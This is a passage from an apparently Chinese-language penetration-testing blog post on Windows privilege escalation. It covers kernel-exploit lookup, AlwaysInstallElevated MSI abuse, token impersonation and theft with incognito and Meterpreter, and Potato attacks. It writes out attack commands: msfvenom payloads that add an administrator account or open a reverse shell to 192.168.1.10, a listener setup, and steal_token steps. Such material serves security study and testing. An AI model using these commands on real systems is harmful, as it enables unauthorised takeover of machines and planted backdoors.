<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="en">
  <head>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>Windows权限提升 - 东隅 Blog</title><meta name="author" content="东隅">
<meta name="author-link" content="">
<meta name="description" content="" /><meta name="keywords" content='攻防, 提权, 内网渗透' />
  <meta itemprop="name" content="windows权限提升">
  <meta itemprop="datePublished" content="2024-08-15T09:31:01+08:00">
  <meta itemprop="dateModified" content="2024-08-15T09:31:01+08:00">
  <meta itemprop="wordCount" content="477">
  <meta itemprop="keywords" content="攻防,提权,内网渗透"><meta property="og:url" content="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows/54/">
  <meta property="og:site_name" content="东隅 Blog">
  <meta property="og:title" content="windows权限提升">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-08-15T09:31:01+08:00">
    <meta property="article:modified_time" content="2024-08-15T09:31:01+08:00">
    <meta property="article:tag" content="攻防">
    <meta property="article:tag" content="提权">
    <meta property="article:tag" content="内网渗透">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="windows权限提升">
<meta name="application-name" content="FixIt">
<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows/54/" /><link rel="prev" href="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows/52/" /><link rel="next" href="https://dongyu29.github.io/posts/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E7%B3%BB%E7%BB%9F/windows/90/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "windows权限提升",
    "inLanguage": "en",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "https:\/\/dongyu29.github.io\/posts\/%E6%94%BB%E9%98%B2\/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F\/windows\/54\/"
    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "攻防, 提权, 内网渗透","wordcount":  477 ,
    "url": "https:\/\/dongyu29.github.io\/posts\/%E6%94%BB%E9%98%B2\/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F\/windows\/54\/","datePublished": "2024-08-15T09:31:01+08:00","dateModified": "2024-08-15T09:31:01+08:00","publisher": {
      "@type": "Organization",
      "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
        "@type": "Person",
        "name": "东隅"
      },"description": ""
  }
  </script></head>
  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a
                class="menu-link"
                href="/posts/"
                
                
              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/categories/"
                
                
              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/tags/"
                
                
              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/about/"
                
                
              ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/about/"
                
                
              ></a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/posts/"
                  
                  
                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/categories/"
                  
                  
                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/tags/"
                  
                  
                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/about/"
                  
                  
                ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/about/"
                  
                  
                ></a></li><li class="menu-item menu-system">
          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
      </ul>
    </nav>
  </div>
</header><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="东隅 Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">Windows权限提升</li>
    </ol>
  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>Windows权限提升</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E6%94%BB%E9%98%B2/" class="post-category" title="Category - 攻防"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 攻防</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="477 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 500 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>3 minutes</span>&nbsp;</div>
    </div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>Contents</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#incognito">incognito</a></li>
    <li><a href="#通过令牌窃取到trustedinstaller权限">通过令牌窃取到TrustedInstaller权限</a></li>
    <li><a href="#土豆">土豆</a></li>
  </ul>

  <ul>
    <li><a href="#不安全的服务权限">不安全的服务权限</a></li>
    <li><a href="#服务注册表权限可控">服务注册表权限可控</a></li>
    <li><a href="#未引用的服务路径">未引用的服务路径</a></li>
  </ul>

  <ul>
    <li>
      <ul>
        <li><a href="#uac白名单">UAC白名单</a></li>
        <li><a href="#dll劫持">DLL劫持</a></li>
        <li><a href="#模拟可信任目录">模拟可信任目录</a></li>
      </ul>
    </li>
  </ul>
</nav></div>
      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h1 id="内核提权" class="heading-element"><span>内核提权</span>
  <a href="#%e5%86%85%e6%a0%b8%e6%8f%90%e6%9d%83" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><p>在进行提权工作时，确定操作系统的<code>内核版本</code>以及<code>补丁编号</code>是首要目标。</p>
<p>在目标主机上执行以下命令，可查看已安装的系统补丁：</p>
<pre tabindex="0"><code>systeminfo</code></pre><p>根据所列出的补丁号以及系统版本等信息，可借助相关<a href="https://i.hacking8.com/tiquan"target="_blank" rel="external nofollow noopener noreferrer">提权辅助网站</a>进行查询以找出相对应的漏洞。</p>
<p>使用WES-NG提权</p>
<blockquote>
<p>WES-NG全称：Windows Exploit Suggester - Next Generation</p>
<p>是由Arris Huijgen基于WES创建的新一代Windows系统辅助提权工具。</p>
</blockquote>
<p><a href="https://github.com/bitsadmin/wesng"target="_blank" rel="external nofollow noopener noreferrer">下载地址</a></p>
<p>使用方法：</p>
<ol>
<li>
<p>在本地主机执行以下命令，以此来更新数据库</p>
<pre tabindex="0"><code>python3 wes.py --update</code></pre></li>
<li>
<p>在目标主机上执行systeminfo命令，并将结果保存在sysinfo.txt文件中。然后在主机上执行以下命令：</p>
<pre tabindex="0"><code>python3 wes.py sysinfo.txt --impact &#34;Elevation of Privilege&#34;
# --impact指定漏洞类型为提权漏洞</code></pre></li>
</ol>
<h1 id="msi安装策略提权" class="heading-element"><span>MSI安装策略提权</span>
  <a href="#msi%e5%ae%89%e8%a3%85%e7%ad%96%e7%95%a5%e6%8f%90%e6%9d%83" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><blockquote>
<p><code>MSI</code>（microsoft installer）是Windows Installer的安装包，它实际上是一个数据库，包含安装一种产品所需要的信息和在很多安装情形下安装（和卸载）程序所需的指令和数据。MSI文件将程序的组成文件与功能关联起来。</p>
</blockquote>
<p>MSI文件提权，即任意用户以SYSTEM权限安装MSI文件造成提权。AlwaysInstallElevated是注册表的一个键值，当其值为1时候，在系统中使用Windows Installer安装任何程序，允许非特权用户以system权限运行MSI文件。如果目标系统上启用了这一设置，我们可以使用msf生成msi文件来以system权限执行任意payload。</p>
<p>MSF集成了漏洞利用模块：exploit/windows/local/always_install_elevated 。详细利用步骤如下：</p>
<ul>
<li>激活AlwaysInstallElevated</li>
</ul>
<p>方法一：在“运行”中输入<em>gpedit.msc</em>，从而打开<code>本地组策略编辑器</code>，本地组策略（gpedit.msc）：计算机配置–管理模板–Windows组件–Windows Installer，点击启用“始终以提升的权限进行安装”；用户配置–管理模板–Windows组件–Windows Installer，点击启用“始终以提升的权限进行安装”。</p>
<p>方法二：cmd修改注册表（rgedit）</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-dockerfile" data-lang="dockerfile"><span style="display:flex;"><span>查询
</span></span><span style="display:flex;"><span>reg query HKCU<span style="color:#a6be9d">\S</span>OFTWARE<span style="color:#a6be9d">\P</span>olicies<span style="color:#a6be9d">\M</span>icrosoft<span style="color:#a6be9d">\W</span>indows<span style="color:#a6be9d">\I</span>nstaller /v AlwaysInstallElevated
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>修改
</span></span><span style="display:flex;"><span>reg add HKCU<span style="color:#a6be9d">\S</span>OFTWARE<span style="color:#a6be9d">\P</span>olicies<span style="color:#a6be9d">\M</span>icrosoft<span style="color:#a6be9d">\W</span>indows<span style="color:#a6be9d">\I</span>nstaller /v AlwaysInstallElevated /t REG_DWORD /d <span style="color:#a6be9d">1</span></span></span></code></pre></div><p>使用msfvenom生成恶意程序上传</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>增加管理员  msfvenom -p windows/adduser <span style="color:#58a1dd">USER</span><span style="color:#ff636f">=</span>test000 <span style="color:#58a1dd">PASSWORD</span><span style="color:#ff636f">=</span>password123! -f msi -o exp.msi
</span></span><span style="display:flex;"><span>获得system会话 msfvenom -p windows/meterpreter/reverse_tcp <span style="color:#58a1dd">LHOST</span><span style="color:#ff636f">=</span> <span style="color:#58a1dd">LPORT</span><span style="color:#ff636f">=</span> -f msi -o exp.msi</span></span></code></pre></div><p>msiexec运行MSI文件</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msiexec /quiet /qn /i exp.msi</span></span></code></pre></div><h1 id="访问令牌操纵" class="heading-element"><span>访问令牌操纵</span>
  <a href="#%e8%ae%bf%e9%97%ae%e4%bb%a4%e7%89%8c%e6%93%8d%e7%ba%b5" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><blockquote>
<p>Windows的访问控制模型由<strong>AT</strong>与<strong>SD</strong>组成。我们这里主要讲述如何运用<code>AT</code>在Windows下提权</p>
</blockquote>
<p>在Windows当中令牌通常可以分为<code>主令牌</code>（Primary Token）和<code>模拟令牌</code>（Impersonation Token）两种。</p>
<ul>
<li>主令牌与进程相关，是由Windows内核所创建并分配给进程的默认访问令牌，每一个进程都有一个主令牌。而在进程与<code>安全对象</code>交互的过程中，系统会使用主令牌，主令牌用来描述服务器的安全上下文。</li>
<li>模拟令牌，描述正在模拟的客户端的<code>安全上下文</code>。</li>
</ul>
<blockquote>
<p><code>安全上下文</code>：指的是⼀类定义==<strong>某个进程允许做什么的许可和权限的集合</strong>==。Windows中的安全上下⽂是通过登录会话（Logon Session）定义的，并通过访问令牌维护。顾名思义，登录会话表⽰某个⽤户在某台计算机上的某次会话过程。开发者可以通过访问令牌与登录会话进⾏交互。访问令牌所有⽤的许可和权限可以与登录会话的不同，但始终是它的⼀个⼦集。</p>
<p><code>安全上下⽂</code>的概念范围是很⼴的，权限、特权、访问令牌、完整性等级等等都包含在其中。 这就是软件限制策略和UAC⼯作原理中的最核⼼部分。 所以在这⾥讨论的内容，都是属于安全上下⽂的范畴。</p>
</blockquote>
<p>==通常情况下，测试人员通过操纵访问令牌，可以使正在运行的进程看起来是其他进程的子进程或属于其他用户所启动的进程，例如system用户。这个过程就被称之为<em>令牌窃取</em>。==</p>
<p>==令牌窃取只能在特权用户上下文中才能完成。这里的特权用户通常为<strong>系统管理员账户</strong>、<strong>网络服务账户</strong>和<strong>系统服务账户</strong>（例如：IIS、MYSQL）。==</p>
<p>令牌窃取往往用来将<strong>管理员</strong>权限提升到<strong>system</strong>权限或者是<strong>TrustedInstaller</strong>权限。</p>
<h2 id="incognito" class="heading-element"><span>incognito</span>
  <a href="#incognito" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p><strong>1.incognito</strong></p>
<p>程序地址：https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip</p>
<p>AccessToken的列举(需要 administrator 权限)</p>
<pre tabindex="0"><code>incognito.exe list_tokens -u</code></pre><p>要使用 AccessToken 模拟其他用户，可以使用命令</p>
<pre tabindex="0"><code>incognito.exe execute -c &#34;完整的 Token 名&#34; cmd.exe</code></pre><p>例如：模拟 system 权限用户（提权至 system）：</p>
<pre tabindex="0"><code>incognito.exe execute -c &#34;NT AUTHORITY\SYSTEM&#34; cmd.exe</code></pre><p>降权至当前用户：</p>
<pre tabindex="0"><code>incognito.exe execute -c &#34;当前用户 token&#34; cmd.exe</code></pre><p>获取域普通用户</p>
<pre tabindex="0"><code>incognito.exe execute -c &#34;icsec\test&#34; cmd.exe</code></pre><p><strong>2.MSF</strong> <strong>下的</strong> <strong>incognito</strong> <strong>模块</strong></p>
<pre tabindex="0"><code># 加载incognito模块
load incognito
#列出目标主机的所有访问令牌
list_tokens -u
# 窃取NT AUTHORITY\SYSTEM账户的令牌
impresonate_token &#34;NT AUTHORITY\SYSTEM&#34;


use incognito #加载 incognito

list_tokens -u #列出 AccessToken

getuid #查看当前 token

impersonate_token &#34;NT AUTHORITY\SYSTEM&#34; #模拟 system 用户，getsystem 命令

即实现了该命令。如果要模拟其他用户，将 token 名改为其他用户即可

steal_token 1252 #从进程窃取 token

getsystem #提升至 system 权限

rev2self #返回到之前的 AccessToken 权限</code></pre><p><strong>3.msf</strong> <strong>令牌实战</strong></p>
<p>msf 生成后门</p>
<pre tabindex="0"><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=6666 LHOST=192.168.1.10 -f exe -o msf.exe</code></pre><p>监听端口</p>
<pre tabindex="0"><code>msfconsole

use exploit/multi/handler

set payload windows/x64/meterpreter/reverse_tcp

set lhost 192.168.1.10

set lport 6666

exploit</code></pre><p>使用incognito</p>
<pre tabindex="0"><code>use incognito #进入 incognito 模块

list_tokens -u #列出令牌

伪造令牌
impersonate_token 12SERVER-01\Administrator #假冒 12server-01\adminstrator 的令牌
impersonate_token moonsec\\test #假冒 icsec\test的令牌
impersonate_token &#34;NT AUTHORITY\SYSTEM&#34; #假冒 System 的令牌</code></pre><p>除了可以伪造令牌 也可以从进程里窃取令牌 首先使用 ps 命令列出进程 查看进程用户使用 steal_token pid 窃取令牌就有对应的权限。</p>
<p>从进程窃取令牌</p>
<pre tabindex="0"><code>steal_token PID</code></pre><h2 id="通过令牌窃取到trustedinstaller权限" class="heading-element"><span>通过令牌窃取到TrustedInstaller权限</span>
  <a href="#%e9%80%9a%e8%bf%87%e4%bb%a4%e7%89%8c%e7%aa%83%e5%8f%96%e5%88%b0trustedinstaller%e6%9d%83%e9%99%90" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><blockquote>
<p>通常情况下我们认为在Linux系统中root权限是Linux中最高的权限，Windows当中system权限是最高权限。这句话前半部分是对的，但后半部分，在Windows中system权限并不是最高权限。在Windows系统下，即使拥有了system权限，也无法在Windows的系统文件中的某些文件中拥有写入权限。</p>
</blockquote>
<p>使用icacls命令可查看某个文件夹对于某些用户来说具有何种权限，发现在<strong>C:/windows/servicing</strong>文件夹下，TrustedInstaller拥有完全控制权限。</p>
<p>TrustedInstaller是从Windows Vista开始所内置的一个安全主体，在Windows中拥有修改系统文件的权限，本身是一个服务，但是以一个账户组的形式出现，全称是：<strong>NT SERVICE\TrustedInstaller</strong>。</p>
<p>因为TrustedIstaller是以windows的一个服务形式存在的，所以可以通过窃取令牌的形式，来使普通用户提升到TrustedInstaller权限。</p>
<ul>
<li>
<p>首先通过<strong>sc start TrustedInstall</strong>命令开启TrustedInstaller服务</p>
</li>
<li>
<p><strong>并记录PID值</strong></p>
</li>
<li>
<p>后使用以下命令，成功获取TrustedInstaller令牌。</p>
<pre tabindex="0"><code>steal_token&lt;PID&gt;</code></pre></li>
</ul>
<h2 id="土豆" class="heading-element"><span>土豆</span>
  <a href="#%e5%9c%9f%e8%b1%86" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>使用Potato提权都需要下列两个特权中的一个。</p>
<ul>
<li>
<p>SeImpersonatePrivilege（替换进程级令牌）</p>
</li>
<li>
<p>SeAssignPrimaryTokenPrivilege （身份验证后模拟客户端）</p>
</li>
</ul>
<p>在实际渗透过程中，拿到webshell下，用户权限是IIS或者apache，或通过SQLi执行xp_cmdshell,此时手里的服务账户在进行操作时是低权限账户，而使用该提权手法可以直接获取SYSTEM权限</p>
<p>显示当前用户权限：</p>
<pre tabindex="0"><code>whoami /priv</code></pre><h1 id="系统服务提权" class="heading-element"><span>系统服务提权</span>
  <a href="#%e7%b3%bb%e7%bb%9f%e6%9c%8d%e5%8a%a1%e6%8f%90%e6%9d%83" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><blockquote>
<p>开始具体介绍系统服务权限之前，有必要介绍一下windows当中的访问控制模型。</p>
</blockquote>
<p>Windows访问控制模型（Access Control Model，ACM）是Windows系统安全性的基础构件。而ACM中通常由访问令牌（Access Token，AT）和安全描述符（Security Descriptor，SD）两部分组成。</p>
<ul>
<li>
<p>访问令牌，AT：当用户登录时，Windows自身会对用户进行验证，==当验证通过后，系统自身会为用户创建一个访问令牌。在此之后，用户所执行的每一个进程都会拥有此访问令牌的副本==，系统也是通过每个访问令牌来区分并确定每个用户。</p>
</li>
<li>
<p>安全描述符，SD：安全描述符是一种与每个安全对象相关联的数据结构，在安全对象创建之初，与各安全对象相对应的安全描述符也被建立。安全描述符主要由==安全标识符（Security Identifiers，SID）==和==访问控制列表（Access Control List，ACL）==两部分组成。</p>
<ul>
<li>
<p>SID是用来标识用户、组、计算机账户的唯一标识。在第一次创建用户时，系统就会为此用户分发一个SID，以此来标识用户。</p>
</li>
<li>
<p>ACL是访问控制项（Access Control Entry，ACE）的列表。每一个ACE中都指定了一系列的访问权限，定义了哪些用户或组对一个安全对象拥有什么样的权限，可以做哪些事情。而ACL则可以理解成是各种ACE的一个集合。</p>
<p>而ACL又具体分为DACL和SACL两种</p>
<ul>
<li>DACL（自主访问控制列表）是安全对象的访问控制策略，简单来说就是规定了一个<code>安全主体</code>对该<code>安全对象</code>拥有什么样的访问权限。</li>
